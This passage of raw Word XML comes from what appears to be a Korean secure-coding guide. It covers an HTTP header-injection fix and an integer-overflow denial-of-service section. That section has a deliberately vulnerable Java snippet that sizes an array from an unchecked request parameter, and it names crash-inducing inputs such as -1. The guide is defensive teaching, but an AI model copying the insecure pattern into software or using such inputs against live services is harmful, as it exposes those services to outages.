                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제거</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>헤더에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String location = request.getParameter("url");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>location = location.replaceAll("[\r\n]", "");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>response.setHeader("Location", location);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRPr="00A747DE" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  14. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>정수형</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>오버플로우</w:t>
      </w:r>
      <w:r w:rsidR="00A747DE">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A747DE">
        <w:rPr>
          <w:rFonts w:eastAsia="맑은 고딕"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>– D-Dos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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>언어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>플랫폼별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정수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타입의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범위를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확인하고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사용한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부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입력값을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메모리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할당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크기로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사용할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경우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적정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범위를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반드시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확인한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>범위</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>메모리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>할당</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>int size = Integer.parseInt(request.getParameter("size"));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">byte[] buf = new byte[size];  // </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>음수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>매우</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>값</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>오류</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공격</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">size </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>파라미터에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> -1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>또는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> Integer.MAX_VALUE+1 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> new byte[-1] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> NegativeArraySizeException </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> OutOfMemoryError</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>전체가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>중단되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> DoS(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>서비스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>거부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>이어집니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>범위</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>int size = Integer.parseInt(request.getParameter("size"));</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
